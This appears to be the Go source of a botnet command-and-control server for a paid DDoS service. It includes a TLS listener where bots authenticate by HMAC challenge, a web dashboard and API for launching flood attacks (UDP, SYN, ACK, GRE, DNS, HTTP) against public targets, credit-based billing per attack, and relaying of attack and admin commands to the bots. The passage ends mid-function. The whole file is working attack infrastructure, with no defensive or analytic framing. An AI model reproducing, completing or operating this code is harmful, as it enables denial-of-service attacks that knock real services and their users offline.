package main

import (
	"bufio"
	"context"
	"crypto/hmac"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"html/template"
	"io"
	"log"
	"math"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"
	"unicode"

	"golang.org/x/crypto/bcrypt"
	"golang.org/x/time/rate"
)

// ---------------------------------------------------------------------------
// configuration
// ---------------------------------------------------------------------------

type ServerConfig struct {
	AccountsPath       string        `json:"users_file"`
	AuditPath          string        `json:"audit_log_file"`
	NodeBindAddr       string        `json:"bot_server_ip"`
	CLIBindAddr        string        `json:"user_server_ip"`
	WebBindAddr        string        `json:"web_server_ip"`
	NodePort           string        `json:"bot_server_port"`
	CLIPort            string        `json:"user_server_port"`
	WebPort            string        `json:"web_server_port"`
	TLSCert            string        `json:"cert_file"`
	TLSKey             string        `json:"key_file"`
	SessionTTL         time.Duration `json:"session_timeout"`
	MaxConnections     int           `json:"max_conns"`
	MaxMsgSize         int           `json:"max_read_size"`
	MaxAuditBytes      int64         `json:"max_log_size"`
	MaxPendingTasks    int           `json:"max_queued_attacks"`
	DailyTaskCap       int           `json:"max_daily_attacks"`
	MaxTaskSeconds     int           `json:"max_attack_duration"`
	MaxCLIPerUser      int           `json:"max_sessions_per_user"`
	MinPassLen         int           `json:"min_password_length"`
	EnforceComplexity  bool          `json:"password_complexity"`
	MaxConnsPerIP      int           `json:"max_connections_per_ip"`
	EnableFirewall     bool          `json:"ddos_protection"`
	ConnRateCap        int           `json:"max_conn_rate"`
	SynThreshold       int           `json:"syn_flood_threshold"`
	ResetTokenTTL      time.Duration `json:"reset_token_validity"`
	SigningSecret      string        `json:"command_signing_key"`
	NodePrunePeriod    time.Duration `json:"bot_cleanup_interval"`
	HeartbeatWindow    time.Duration `json:"heartbeat_interval"`
	ChallengeSalt      string        `json:"challenge_salt"`
}

// ---------------------------------------------------------------------------
// ansi palette
// ---------------------------------------------------------------------------

const (
	ansiDim    = "237"
	ansiBase   = "240"
	ansiMid    = "243"
	ansiHi     = "246"
	ansiPale   = "249"
	ansiBright = "251"
	ansiWhite  = "254"
	ansiGreen  = "114"
	ansiRed    = "160"
	ansiWarn   = "166"
	ansiBlue   = "117"
	ansiViolet = "183"
)

// ---------------------------------------------------------------------------
// domain models
// ---------------------------------------------------------------------------

type Account struct {
	Username       string           `json:"username"`
	PasswordHash   string           `json:"passwordHash"`
	APIKey         string           `json:"apiKey"`
	Expire         time.Time        `json:"expire"`
	Level          string           `json:"level"`
	LastLogin      time.Time        `json:"lastLogin"`
	FailedAttempts int              `json:"failedAttempts"`
	LockedUntil    time.Time        `json:"lockedUntil"`
	CreatedAt      time.Time        `json:"createdAt"`
	LastActivity   time.Time        `json:"lastActivity"`
	WalletAddress  string           `json:"walletAddress"`
	Credits        int              `json:"credits"`
	Transactions   []TransactionLog `json:"transactions"`
}

type TransactionLog struct {
	Description string    `json:"description"`
	Time        time.Time `json:"time"`
	Amount      int       `json:"amount"`
	Status      string    `json:"status"`
	Target      string    `json:"target"`
}

type Node struct {
	Arch          string    `json:"Arch"`
	Conn          net.Conn  `json:"-"`
	IP            string    `json:"IP"`
	Time          time.Time `json:"Time"`
	Country       string    `json:"Country"`
	City          string    `json:"City"`
	Region        string    `json:"Region"`
	Cores         int       `json:"Cores"`
	RAM           float64   `json:"RAM"`
	LastHeartbeat time.Time `json:"LastHeartbeat"`
}

type Task struct {
	Method    string        `json:"method"`
	Target    string        `json:"target"`
	Port      string        `json:"port"`
	Duration  time.Duration `json:"duration"`
	StartedAt time.Time     `json:"start"`
	Owner     string        `json:"user"`
	Conn      net.Conn      `json:"-"`
	QueuedAt  time.Time     `json:"queueTime"`
	Priority  int           `json:"priority"`
	Signature string        `json:"signature"`
}

type TaskSummary struct {
	Method    string `json:"method"`
	Target    string `json:"target"`
	Port      string `json:"port"`
	Duration  string `json:"duration"`
	Remaining string `json:"remaining"`
	ID        string `json:"id"`
}

type DashboardMetrics struct {
	NodeCount    int           `json:"botCount"`
	RunningTasks int           `json:"activeAttacks"`
	Tasks        []TaskSummary `json:"attacks"`
	Bots         []Node        `json:"bots"`
}

type DashboardData struct {
	User       Account
	PeerCount  int
	ActiveHits []TaskSummary
	Bots       []Node
	Users      []Account
	Flash      string
	Notice     string
	BotsJSON   template.JS
	StartTime  time.Time
}

type CLISession struct {
	conn       net.Conn
	acct       Account
	sid        string
	lastCmd    time.Time
	addr       string
	ctx        context.Context
	cancel     context.CancelFunc
}

type TaskScheduler struct {
	active    map[net.Conn]Task
	pending   []Task
	scheduled []Task
	mu        sync.RWMutex
}

type SessionRegistry struct {
	inner sync.Map
}

type PasswordToken struct {
	user    string
	token   string
	expires time.Time
	used    bool
}

type NodeMetrics struct {
	Seen         time.Time
	Latency      time.Duration
	Throughput   float64
	RAM          float64
	Cores        int
	Architecture string
}

type FleetSummary struct {
	AvgLatency    time.Duration
	AvgThroughput float64
	TotalRAM      float64
	TotalCores    int
	Healthy       int
	Unhealthy     int
}

type EventBroadcaster struct {
	subs   map[chan string]struct{}
	subsMu sync.Mutex
}

type RateBucket struct {
	rl         *rate.Limiter
	seen       time.Time
	todayCount int
	dayStart   time.Time
	dailyCap   int
}

type cliState struct {
	client     *CLISession
	lastActive time.Time
	loginIP    string
	expires    time.Time
}

// ---------------------------------------------------------------------------
// globals
// ---------------------------------------------------------------------------

var (
	cfg                    *ServerConfig
	nodes                  []Node
	nodeConns              []net.Conn
	scheduler              = &TaskScheduler{active: make(map[net.Conn]Task)}
	webSessions            = make(map[string]Account)
	cliRegistry            = &SessionRegistry{}
	startedAt              = time.Now()
	sigSecret              []byte
	cliClients             []*CLISession
	nodeGate               = rate.NewLimiter(rate.Every(5*time.Second), 1)
	loginGate              = rate.NewLimiter(rate.Every(5*time.Minute), 5)
	ipBuckets              = make(map[string]*RateBucket)
	userBuckets            = make(map[string]*RateBucket)
	cliCountPerUser        = make(map[string]int)
	connSemaphore          chan struct{}
	blocklist              = make(map[string]time.Time)
	fleetMetrics           = make(map[string]NodeMetrics)
	resetTokens            = struct {
		sync.RWMutex
		store map[string]PasswordToken
	}{store: make(map[string]PasswordToken)}
	knownMethods = map[string]bool{
		"!udpflood": true, "!udpsmart": true, "!tcpflood": true, "!synflood": true,
		"!ackflood": true, "!greflood": true, "!dns": true, "!http": true,
	}
	reservedCIDR = []string{
		"10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "127.0.0.0/8",
		"169.254.0.0/16", "224.0.0.0/4", "::1/128", "fc00::/7", "fe80::/10",
	}
	tmpl      *template.Template
	publisher = newBroadcaster()
)

const hbGrace = 30 * time.Second

var (
	webMu      sync.Mutex
	nodeMu     sync.Mutex
	bucketMu   sync.Mutex
	cliCountMu sync.Mutex
	blockMu    sync.Mutex
	metricsMu  sync.Mutex
	logMu      sync.Mutex
)

// ---------------------------------------------------------------------------
// entrypoint
// ---------------------------------------------------------------------------

func main() {
	var err error
	cfg, err = readConfig()
	if err != nil {
		log.Fatalf("config load: %v", err)
	}
	if err := checkConfig(); err != nil {
		log.Fatalf("config invalid: %v", err)
	}

	sigSecret = []byte(cfg.SigningSecret)
	connSemaphore = make(chan struct{}, cfg.MaxConnections)

	if !pathExists(cfg.TLSCert) || !pathExists(cfg.TLSKey) {
		generateSelfSignedCert()
	}
	if !pathExists(cfg.AccountsPath) {
		bootstrapAdmin()
	}
	if err := initTemplates(); err != nil {
		log.Fatalf("templates: %v", err)
	}

	go listenNodes()
	go listenCLI()
	go pruneNodeLoop()
	go listenWeb()
	go reapSessions()
	go reapBuckets()
	go reapBlocklist()
	go rotateAuditLog()
	go refreshTitle()
	go systemHealthLoop()
	go scheduler.processScheduled()
	go pushMetrics()

	if cfg.EnableFirewall {
		go applyFirewallRules()
	}

	select {}
}

// ---------------------------------------------------------------------------
// sse broadcaster
// ---------------------------------------------------------------------------

func newBroadcaster() *EventBroadcaster {
	return &EventBroadcaster{subs: make(map[chan string]struct{})}
}

func (eb *EventBroadcaster) add(ch chan string) {
	eb.subsMu.Lock()
	defer eb.subsMu.Unlock()
	eb.subs[ch] = struct{}{}
}

func (eb *EventBroadcaster) remove(ch chan string) {
	eb.subsMu.Lock()
	defer eb.subsMu.Unlock()
	delete(eb.subs, ch)
	close(ch)
}

func (eb *EventBroadcaster) send(msg string) {
	eb.subsMu.Lock()
	defer eb.subsMu.Unlock()
	for ch := range eb.subs {
		select {
		case ch <- msg:
		default:
			go eb.remove(ch)
		}
	}
}

func pushMetrics() {
	tick := time.NewTicker(1 * time.Second)
	defer tick.Stop()
	for range tick.C {
		m := liveSnapshot()
		raw, _ := json.Marshal(m)
		publisher.send(string(raw))
	}
}

func liveSnapshot() DashboardMetrics {
	nodeMu.Lock()
	all := onlineNodes()
	live := make([]Node, 0)
	for _, n := range all {
		if time.Since(n.LastHeartbeat) <= 2*cfg.HeartbeatWindow {
			live = append(live, n)
		}
	}
	nodeMu.Unlock()

	scheduler.mu.RLock()
	summaries := make([]TaskSummary, 0, len(scheduler.active))
	for _, t := range scheduler.active {
		rem := time.Until(t.StartedAt.Add(t.Duration))
		if rem <= 0 {
			continue
		}
		summaries = append(summaries, TaskSummary{
			Method:    t.Method,
			Target:    t.Target,
			Port:      t.Port,
			Duration:  fmt.Sprintf("%.0fs", t.Duration.Seconds()),
			Remaining: fmtDuration(rem),
			ID:        t.Method + "-" + t.Target + "-" + t.Port,
		})
	}
	scheduler.mu.RUnlock()

	return DashboardMetrics{
		NodeCount:    len(live),
		RunningTasks: len(summaries),
		Tasks:        summaries,
		Bots:         live,
	}
}

// ---------------------------------------------------------------------------
// template engine
// ---------------------------------------------------------------------------

func initTemplates() error {
	fns := template.FuncMap{
		"credits": func(v int) string {
			if v < 0 {
				return "∞"
			}
			return fmt.Sprintf("%d", v)
		},
		"power":     networkPower,
		"concLimit": concurrencyLimit,
		"methodIcon": func(m string) template.HTML {
			icons := map[string]string{
				"!udpflood": "fa-bolt", "!udpsmart": "fa-brain",
				"!tcpflood": "fa-network-wired", "!synflood": "fa-sync",
				"!ackflood": "fa-reply", "!greflood": "fa-project-diagram",
				"!dns": "fa-server", "!http": "fa-globe",
			}
			if ic, ok := icons[m]; ok {
				return template.HTML(fmt.Sprintf(`<i class="fas %s"></i>`, ic))
			}
			return template.HTML(`<i class="fas fa-question"></i>`)
		},
		"methodName": prettyMethod,
		"isOnline": func(hb time.Time) bool {
			return time.Since(hb) <= 2*hbGrace
		},
		"costRate": func(c int) float64  { return float64(c) / 1000.0 },
		"fmtTime":  func(t time.Time) string { return t.Format("2006-01-02 15:04:05") },
		"div": func(a, b uint64) float64 {
			if b == 0 {
				return 0
			}
			return float64(a) / float64(b)
		},
		"now":  func() time.Time { return time.Now() },
		"sub":  func(a, b uint64) uint64 { return a - b },
		"toGB": func(b uint64) float64 { return float64(b) / 1073741824.0 },
		"upHours": func(t time.Time) float64 {
			return time.Since(t).Hours()
		},
	}
	var err error
	tmpl, err = template.New("").Funcs(fns).ParseGlob("templates/*.html")
	return err
}

// ---------------------------------------------------------------------------
// web server
// ---------------------------------------------------------------------------

func listenWeb() {
	srv := &http.Server{
		Addr: fmt.Sprintf("%s:%s", cfg.WebBindAddr, cfg.WebPort),
		TLSConfig: &tls.Config{
			MinVersion:       tls.VersionTLS13,
			CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256},
			CipherSuites: []uint16{
				tls.TLS_AES_128_GCM_SHA256,
				tls.TLS_AES_256_GCM_SHA384,
				tls.TLS_CHACHA20_POLY1305_SHA256,
			},
		},
	}

	http.HandleFunc("/", handleIndex)
	http.HandleFunc("/events", withAuth(handleEvents))
	http.HandleFunc("/login", handleLogin)
	http.HandleFunc("/dashboard", withAuth(handleDashboard))
	http.HandleFunc("/admin-command", withAuth(handleAdminCmd))
	http.HandleFunc("/attack", withAuth(handleNewTask))
	http.HandleFunc("/stop-all-attacks", withAuth(handleStopAll))
	http.HandleFunc("/stop-attack", withAuth(handleStopOne))
	http.HandleFunc("/add-user", withAuth(handleCreateAccount))
	http.HandleFunc("/delete-user", withAuth(handleDeleteAccount))
	http.HandleFunc("/logout", handleLogout)
	fs := http.FileServer(http.Dir("static"))
	http.Handle("/static/", http.StripPrefix("/static/", fs))
	http.HandleFunc("/api/peers", withAPIKey(apiListNodes))
	http.HandleFunc("/api/attacks", withAPIKey(apiListTasks))
	http.HandleFunc("/api/users", withAPIKey(apiListAccounts))
	http.HandleFunc("/api/stats", withAPIKey(apiServerStats))
	http.HandleFunc("/api/generate-key", withAPIKey(apiNewKey))

	log.Fatal(srv.ListenAndServeTLS(cfg.TLSCert, cfg.TLSKey))
}

func handleEvents(w http.ResponseWriter, r *http.Request, _ Account) {
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")

	fl, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "SSE not supported", http.StatusInternalServerError)
		return
	}

	ch := make(chan string)
	publisher.add(ch)
	defer publisher.remove(ch)

	ctx := r.Context()
	for {
		select {
		case <-ctx.Done():
			return
		case msg := <-ch:
			fmt.Fprintf(w, "data: %s\n\n", msg)
			fl.Flush()
		}
	}
}

func handleIndex(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.Redirect(w, r, "/", http.StatusSeeOther)
		return
	}
	sid := cookieSession(r)
	if _, ok := fetchSession(sid); ok {
		http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
		return
	}
	t := template.Must(template.ParseFiles("templates/login.html"))
	t.Execute(w, nil)
}

func handleLogin(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Redirect(w, r, "/", http.StatusSeeOther)
		return
	}

	user := r.FormValue("username")
	pass := r.FormValue("password")

	if ok, acct := checkCredentials(user, pass); ok {
		newSID := secureToken(64)
		if old := cookieSession(r); old != "" {
			dropSession(old)
		}
		storeSession(newSID, *acct)
		http.SetCookie(w, &http.Cookie{
			Name:     "session",
			Value:    newSID,
			Path:     "/",
			Secure:   true,
			HttpOnly: true,
			MaxAge:   3600,
			SameSite: http.SameSiteStrictMode,
		})
		http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
	} else {
		t := template.Must(template.ParseFiles("templates/login.html"))
		t.Execute(w, struct{ Error string }{"Invalid username or password"})
	}
}

func handleLogout(w http.ResponseWriter, r *http.Request) {
	if sid := cookieSession(r); sid != "" {
		dropSession(sid)
	}
	http.SetCookie(w, &http.Cookie{
		Name: "session", Value: "", Path: "/", MaxAge: -1,
		Secure: true, HttpOnly: true, SameSite: http.SameSiteStrictMode,
	})
	http.Redirect(w, r, "/", http.StatusSeeOther)
}

func handleAdminCmd(w http.ResponseWriter, r *http.Request, acct Account) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if acct.Level != "Owner" && acct.Level != "Admin" {
		http.Error(w, "Permission denied", http.StatusForbidden)
		return
	}
	cmd := r.FormValue("command")
	if cmd == "" {
		http.Error(w, "No command provided", http.StatusBadRequest)
		return
	}
	relayToNodes(cmd, acct.Username)
	w.Write([]byte("Command sent successfully"))
}

func handleNewTask(w http.ResponseWriter, r *http.Request, acct Account) {
	if r.Method != "POST" {
		http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
		return
	}

	method := r.FormValue("method")
	target := r.FormValue("ip")
	port := r.FormValue("port")
	durStr := r.FormValue("duration")

	if !knownMethods[method] {
		http.Redirect(w, r, "/dashboard?flash=Invalid+attack+method", http.StatusSeeOther)
		return
	}
	if !validTarget(target) {
		http.Redirect(w, r, "/dashboard?flash=Invalid+target+IP/hostname", http.StatusSeeOther)
		return
	}
	if !validPort(port) {
		http.Redirect(w, r, "/dashboard?flash=Invalid+port+number", http.StatusSeeOther)
		return
	}

	dur, err := strconv.Atoi(durStr)
	if err != nil || dur <= 0 || dur > cfg.MaxTaskSeconds {
		http.Redirect(w, r, "/dashboard?flash=Invalid+duration", http.StatusSeeOther)
		return
	}
	if len(scheduler.active) >= cfg.MaxPendingTasks {
		http.Redirect(w, r, "/dashboard?flash=Maximum+attack+limit+reached", http.StatusSeeOther)
		return
	}
	if method == "!dns" {
		if p, _ := strconv.Atoi(port); p != 53 {
			http.Redirect(w, r, "/dashboard?flash=DNS+attacks+must+target+port+53", http.StatusSeeOther)
			return
		}
	}
	if acct.Credits >= 0 {
		cost := computeCost(method, dur)
		if acct.Credits < cost {
			http.Redirect(w, r, "/dashboard?flash=Not+enough+credits", http.StatusSeeOther)
			return
		}
	}

	t := Task{
		Method:    method,
		Target:    target,
		Port:      port,
		Duration:  time.Duration(dur) * time.Second,
		StartedAt: time.Now(),
		Owner:     acct.Username,
		Signature: signPayload(fmt.Sprintf("%s %s %s %d", method, target, port, dur)),
	}

	scheduler.mu.Lock()
	defer scheduler.mu.Unlock()

	if len(scheduler.active) >= scheduler.cap() {
		scheduler.pending = append(scheduler.pending, t)
		http.Redirect(w, r, "/dashboard?flash=Attack+queued", http.StatusSeeOther)
		return
	}
	scheduler.active[nil] = t

	if acct.Credits >= 0 {
		accts := loadAccounts()
		for i := range accts {
			if accts[i].Username == acct.Username {
				accts[i].Credits -= computeCost(method, dur)
				accts[i].Transactions = append(accts[i].Transactions, TransactionLog{
					Description: "Attack", Target: target, Time: time.Now(), Amount: dur, Status: method,
				})
				break
			}
		}
		persistAccounts(accts)
	}

	cmd := fmt.Sprintf("%s %s %s %d", method, target, port, dur)
	relayToNodes(cmd, acct.Username)
	logTask(method, target, port, durStr, acct.Username)
	http.Redirect(w, r, "/dashboard?flash=Attack+launched+successfully", http.StatusSeeOther)
}

func computeCost(method string, secs int) int {
	mult := map[string]float64{
		"!udpflood": 1.0, "!udpsmart": 1.2, "!tcpflood": 1.5, "!synflood": 1.3,
		"!ackflood": 1.1, "!greflood": 1.4, "!dns": 2.0, "!http": 2.5,
	}
	m := mult[method]
	if m == 0 {
		m = 1.0
	}
	return int(float64(secs) * m)
}

func handleStopAll(w http.ResponseWriter, r *http.Request, acct Account) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	scheduler.mu.Lock()
	defer scheduler.mu.Unlock()
	if len(scheduler.active) == 0 {
		http.Error(w, "No active attacks to stop", http.StatusBadRequest)
		return
	}
	scheduler.active = make(map[net.Conn]Task)
	relayToNodes("STOP ALL", acct.Username)
	w.Write([]byte("All attacks stopped"))
}

func handleStopOne(w http.ResponseWriter, r *http.Request, acct Account) {
	tid := r.URL.Query().Get("id")
	if tid == "" {
		http.Redirect(w, r, "/dashboard?flash=Invalid attack ID", http.StatusSeeOther)
		return
	}
	scheduler.mu.Lock()
	defer scheduler.mu.Unlock()
	for c, t := range scheduler.active {
		if t.Method+"-"+t.Target+"-"+t.Port == tid {
			relayToNodes(fmt.Sprintf("STOP %s", t.Target), acct.Username)
			delete(scheduler.active, c)
			http.Redirect(w, r, "/dashboard?flash=Attack stopped", http.StatusSeeOther)
			return
		}
	}
	http.Redirect(w, r, "/dashboard?flash=Attack not found", http.StatusSeeOther)
}

func handleCreateAccount(w http.ResponseWriter, r *http.Request, acct Account) {
	if acct.Level != "Owner" {
		http.Redirect(w, r, "/dashboard?flash=Permission denied", http.StatusSeeOther)
		return
	}
	if r.Method != "POST" {
		http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
		return
	}
	uname := r.FormValue("username")
	pw := r.FormValue("password")
	role := r.FormValue("level")
	if uname == "" || pw == "" || role == "" {
		http.Redirect(w, r, "/dashboard?flash=Missing user information", http.StatusSeeOther)
		return
	}
	if err := validatePassword(pw); err != nil {
		http.Redirect(w, r, "/dashboard?flash="+url.QueryEscape(err.Error()), http.StatusSeeOther)
		return
	}
	all := loadAccounts()
	hash, _ := bcrypt.GenerateFromPassword([]byte(pw), bcrypt.DefaultCost)
	all = append(all, Account{
		Username: uname, PasswordHash: string(hash), APIKey: secureToken(64),
		Expire: time.Now().AddDate(1, 0, 0), Level: role,
		CreatedAt: time.Now(), LastActivity: time.Now(),
	})
	persistAccounts(all)
	http.Redirect(w, r, "/dashboard?flash=User added successfully", http.StatusSeeOther)
}

func handleDeleteAccount(w http.ResponseWriter, r *http.Request, acct Account) {
	if acct.Level != "Owner" {
		http.Redirect(w, r, "/dashboard?flash=Permission denied", http.StatusSeeOther)
		return
	}
	uname := r.URL.Query().Get("username")
	if uname == "" {
		http.Redirect(w, r, "/dashboard?flash=Invalid username", http.StatusSeeOther)
		return
	}
	if err := removeAccount(uname); err != nil {
		http.Redirect(w, r, "/dashboard?flash=Error deleting user: "+err.Error(), http.StatusSeeOther)
		return
	}
	http.Redirect(w, r, "/dashboard?flash=User deleted successfully", http.StatusSeeOther)
}

func handleDashboard(w http.ResponseWriter, r *http.Request, acct Account) {
	data := DashboardData{
		User:       acct,
		PeerCount:  countNodes(),
		ActiveHits: runningTaskSummaries(),
		Bots:       onlineNodes(),
		Users:      loadAccounts(),
		StartTime:  startedAt,
	}
	js, _ := json.Marshal(data.Bots)
	data.BotsJSON = template.JS(js)
	if f := r.URL.Query().Get("flash"); f != "" {
		data.Flash = f
	}
	if err := tmpl.ExecuteTemplate(w, "dashboard.html", data); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		log.Printf("template render: %v", err)
	}
}

// ---------------------------------------------------------------------------
// api endpoints
// ---------------------------------------------------------------------------

func apiListNodes(w http.ResponseWriter, _ *http.Request, _ Account) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(onlineNodes())
}

func apiListTasks(w http.ResponseWriter, _ *http.Request, _ Account) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(runningTaskSummaries())
}

func apiListAccounts(w http.ResponseWriter, _ *http.Request, acct Account) {
	if acct.Level != "Owner" && acct.Level != "Admin" {
		http.Error(w, "Permission denied", http.StatusForbidden)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(loadAccounts())
}

func apiServerStats(w http.ResponseWriter, _ *http.Request, _ Account) {
	out := struct {
		NodeCount    int     `json:"botCount"`
		RunningTasks int     `json:"activeAttacks"`
		Uptime       float64 `json:"uptime"`
	}{
		NodeCount:    countNodes(),
		RunningTasks: len(scheduler.active),
		Uptime:       time.Since(startedAt).Hours(),
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(out)
}

func apiNewKey(w http.ResponseWriter, r *http.Request, acct Account) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	key := secureToken(64)
	all := loadAccounts()
	for i := range all {
		if all[i].Username == acct.Username {
			all[i].APIKey = key
			break
		}
	}
	persistAccounts(all)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(struct{ APIKey string }{APIKey: key})
}

// ---------------------------------------------------------------------------
// console logging
// ---------------------------------------------------------------------------

func logConnect(kind, addr string) {
	logMu.Lock()
	defer logMu.Unlock()
	fmt.Printf("\033[36m[%s] [CONNECTION] %s connected from %s\033[0m\n",
		time.Now().Format("2006-01-02 15:04:05"), kind, addr)
}

func logDisconnect(kind, addr string) {
	logMu.Lock()
	defer logMu.Unlock()
	fmt.Printf("\033[33m[%s] [DISCONNECTION] %s disconnected from %s\033[0m\n",
		time.Now().Format("2006-01-02 15:04:05"), kind, addr)
}

func logTask(method, target, port, dur, user string) {
	logMu.Lock()
	defer logMu.Unlock()
	fmt.Printf("\033[31m[%s] [ATTACK] %s launched %s attack on %s:%s for %s seconds\033[0m\n",
		time.Now().Format("2006-01-02 15:04:05"), user, method, target, port, dur)
}

// ---------------------------------------------------------------------------
// auth middleware
// ---------------------------------------------------------------------------

func withAuth(h func(http.ResponseWriter, *http.Request, Account)) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		sid := cookieSession(r)
		if sid == "" {
			http.Redirect(w, r, "/?flash=Please login first", http.StatusSeeOther)
			return
		}
		acct, ok := fetchSession(sid)
		if !ok {
			http.Redirect(w, r, "/?flash=Please login first", http.StatusSeeOther)
			return
		}
		h(w, r, acct)
	}
}

func withAPIKey(h func(http.ResponseWriter, *http.Request, Account)) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		key := r.Header.Get("X-API-Key")
		if key == "" {
			http.Error(w, "API key required", http.StatusUnauthorized)
			return
		}
		for _, a := range loadAccounts() {
			if a.APIKey == key {
				h(w, r, a)
				return
			}
		}
		http.Error(w, "Invalid API key", http.StatusUnauthorized)
	}
}

// ---------------------------------------------------------------------------
// node listener
// ---------------------------------------------------------------------------

func listenNodes() {
	pair, err := tls.LoadX509KeyPair(cfg.TLSCert, cfg.TLSKey)
	if err != nil {
		log.Fatalf("node tls: %v", err)
	}
	tc := &tls.Config{Certificates: []tls.Certificate{pair}, MinVersion: tls.VersionTLS12}
	ln, err := tls.Listen("tcp", fmt.Sprintf("%s:%s", cfg.NodeBindAddr, cfg.NodePort), tc)
	if err != nil {
		log.Fatalf("node listen: %v", err)
	}
	defer ln.Close()

	for {
		c, err := ln.Accept()
		if err != nil {
			continue
		}
		go onNodeConnect(c)
	}
}

func onNodeConnect(c net.Conn) {
	addr := c.RemoteAddr().String()
	logConnect("NODE", addr)
	defer func() {
		logDisconnect("NODE", addr)
		c.Close()
		detachNode(c)
	}()

	if !nodeGate.Allow() {
		return
	}

	rd := bufio.NewReader(c)

	nonce, err := sendChallenge(c)
	if err != nil {
		return
	}
	ok, err := verifyChallengeReply(rd, nonce)
	if err != nil || !ok {
		return
	}

	ip, _, _ := net.SplitHostPort(addr)
	n := Node{Conn: c, IP: ip, Time: time.Now(), LastHeartbeat: time.Now()}

	nodeMu.Lock()
	nodes = append(nodes, n)
	nodeConns = append(nodeConns, c)
	nodeMu.Unlock()

	sc := bufio.NewScanner(rd)
	for sc.Scan() {
		line := sc.Text()
		c.SetDeadline(time.Now().Add(cfg.HeartbeatWindow * 2))

		switch {
		case strings.HasPrefix(line, "PONG:"):
			parts := strings.Split(line, ":")
			if len(parts) >= 4 {
				updateNodeHW(c, parts[1], parts[2], parts[3])
			}
		case strings.HasPrefix(line, "HEARTBEAT:"):
			parts := strings.Split(line, ":")
			if len(parts) >= 4 {
				updateNodeHW(c, parts[1], parts[2], parts[3])
			}
			touchNode(c)
		}
	}
}

func sendChallenge(c net.Conn) (string, error) {
	buf := make([]byte, 32)
	if _, err := rand.Read(buf); err != nil {
		return "", err
	}
	b64 := base64.StdEncoding.EncodeToString(buf)
	_, err := fmt.Fprintf(c, "CHALLENGE:%s\n", b64)
	return b64, err
}

func verifyChallengeReply(rd *bufio.Reader, nonce string) (bool, error) {
	resp, err := rd.ReadString('\n')
	if err != nil {
		return false, err
	}
	raw, _ := base64.StdEncoding.DecodeString(nonce)
	mac := hmac.New(sha256.New, []byte(cfg.ChallengeSalt))
	mac.Write(raw)
	want := base64.StdEncoding.EncodeToString(mac.Sum(nil))
	return strings.TrimSpace(resp) == want, nil
}

// ---------------------------------------------------------------------------
// cli listener
// ---------------------------------------------------------------------------

func listenCLI() {
	tc := buildServerTLS()
	if tc == nil {
		return
	}
	ln, err := tls.Listen("tcp", cfg.CLIBindAddr+":"+cfg.CLIPort, tc)
	if err != nil {
		return
	}
	defer ln.Close()

	for {
		c, err := ln.Accept()
		if err != nil {
			continue
		}
		go onCLIConnect(c)
	}
}

func onCLIConnect(c net.Conn) {
	addr := c.RemoteAddr().String()
	logConnect("USER", addr)
	defer func() {
		logDisconnect("USER", addr)
		c.Close()
		<-connSemaphore
		detachCLI(c)
	}()

	tc, ok := c.(*tls.Conn)
	if !ok {
		return
	}
	if err := tc.Handshake(); err != nil {
		return
	}
	routeCLI(tc)
}

func pruneNodeLoop() {
	tick := time.NewTicker(cfg.NodePrunePeriod)
	defer tick.Stop()
	for range tick.C {
		pruneStaleNodes()
	}
}

func pruneStaleNodes() {
	nodeMu.Lock()
	defer nodeMu.Unlock()
	cutoff := 2 * cfg.HeartbeatWindow
	var kept []Node
	for _, n := range nodes {
		if time.Since(n.LastHeartbeat) <= cutoff {
			kept = append(kept, n)
		} else if n.Conn != nil {
			n.Conn.Close()
		}
	}
	nodes = kept
}

// ---------------------------------------------------------------------------
// utility: tokens, port/ip validation, etc.
// ---------------------------------------------------------------------------

func secureToken(n int) string {
	const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(alphabet))))
		b[i] = alphabet[idx.Int64()]
	}
	return string(b)
}

func validPort(s string) bool {
	p, err := strconv.Atoi(s)
	return err == nil && p > 0 && p <= 65535
}

func validTarget(s string) bool {
	ip := net.ParseIP(s)
	if ip != nil {
		return !isReservedIP(ip)
	}
	if _, err := net.ResolveIPAddr("ip6", s); err == nil {
		return true
	}
	if _, err := net.LookupHost(s); err == nil {
		return true
	}
	return false
}

func isReservedIP(ip net.IP) bool {
	blocks := []*net.IPNet{
		{IP: net.ParseIP("10.0.0.0"), Mask: net.CIDRMask(8, 32)},
		{IP: net.ParseIP("172.16.0.0"), Mask: net.CIDRMask(12, 32)},
		{IP: net.ParseIP("192.168.0.0"), Mask: net.CIDRMask(16, 32)},
		{IP: net.ParseIP("127.0.0.0"), Mask: net.CIDRMask(8, 32)},
		{IP: net.ParseIP("169.254.0.0"), Mask: net.CIDRMask(16, 32)},
		{IP: net.ParseIP("::1"), Mask: net.CIDRMask(128, 128)},
